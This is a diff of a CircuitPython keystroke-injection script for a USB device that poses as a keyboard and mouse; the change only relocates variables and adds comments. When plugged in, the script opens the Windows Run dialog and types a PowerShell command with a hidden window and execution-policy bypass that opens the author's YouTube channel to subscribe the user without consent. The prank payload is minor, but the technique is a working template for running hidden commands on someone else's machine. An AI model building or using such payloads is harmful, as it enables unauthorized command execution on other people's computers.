@@ -3,19 +3,21 @@
 #Author: EvMaster114
 #Description: Subscribes you to my youtube channel
 
+#Imports
 import usb_hid
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.mouse import Mouse
 from adafruit_hid.keycode import Keycode as key
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 from time import sleep
+#Varibales
+kbd = Keyboard(usb_hid.devices)
+lay = KeyboardLayoutUS(kbd)
+mse = Mouse(usb_hid.devices)
 
 channel = "https://www.youtube.com/channel/UCORBRBB8A0k7XBAngb3k44w"
-def main():
-    kbd = Keyboard(usb_hid.devices)
-    lay = KeyboardLayoutUS(kbd)
-    mse = Mouse(usb_hid.devices)
 
+def main():
     kbd.send(key.GUI, key.R)
     sleep(0.5)
     lay.write('powershell -w h -NoP -NonI -Exec Bypass Start-Process "' + channel + '?sub_confirmation=1"')
